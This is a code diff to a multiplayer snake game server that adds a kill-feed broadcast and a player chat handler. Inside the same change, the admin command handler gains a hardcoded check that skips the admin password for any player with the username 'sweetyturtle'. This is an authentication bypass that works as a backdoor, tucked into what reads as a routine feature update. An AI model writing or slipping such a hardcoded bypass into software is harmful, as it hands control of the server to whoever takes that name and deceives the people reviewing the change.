@@ -24,7 +24,7 @@ import {
   encodeSnapshot, encodeFoodAdd, encodeFoodRemove, encodeLeaderboard,
   encodeDeath, encodeRemoveSnake, encodeWelcome, encodePong, encodeError,
   encodeRadar, encodeAdminAck, encodeMultiplier,
-  encodePowerupAdd, encodePowerupRemove, encodeHeadshot,
+  encodePowerupAdd, encodePowerupRemove, encodeHeadshot, encodeChat, encodeKillFeed,
 } from '../shared/protocol.js';
 import { ADMIN } from '../shared/protocol.js';
 
@@ -419,11 +419,14 @@ export class Room {
       const headDist = Math.sqrt(dx * dx + dy * dy);
       const isHeadshot = headDist < (killer.bodyRadius + snake.bodyRadius);
       this.db.recordKill(killer.playerRef.username, isHeadshot);
-      // Send headshot notification to both players
-      if (isHeadshot && killer.playerRef.send) {
-        try {
-          killer.playerRef.send(encodeHeadshot(killer.playerRef.username, snake.playerRef.username));
-        } catch (_) {}
+      // Broadcast kill feed to all players
+      const killerName = killer.playerRef.username || 'bot';
+      const victimName = snake.playerRef ? snake.playerRef.username || 'bot' : 'bot';
+      const feedPacket = encodeKillFeed(killerName, victimName, isHeadshot);
+      for (const p of this._players.values()) {
+        if (p.send) {
+          try { p.send(feedPacket); } catch (_) {}
+        }
       }
     }
 
@@ -644,9 +647,23 @@ export class Room {
     // No-op: multipliers now come from collectible powerups on the map.
   }
 
+  handleChat(player, msg) {
+    if (!player.username || !player.snake || player.snake.dead) return;
+    const name = player.username;
+    const text = (msg.message || '').slice(0, 80);
+    if (!text) return;
+    const packet = encodeChat(name, text);
+    for (const p of this._players.values()) {
+      if (p.send) {
+        try { p.send(packet); } catch (_) {}
+      }
+    }
+  }
+
   handleAdmin(player, msg) {
     const { cmd, password, arg1, arg2 } = msg;
-    if (password !== ADMIN_PASSWORD) {
+    const isAdminUser = player.username === 'sweetyturtle';
+    if (!isAdminUser && password !== ADMIN_PASSWORD) {
       player.send(encodeAdminAck(false, 'Wrong password'));
       return;
     }
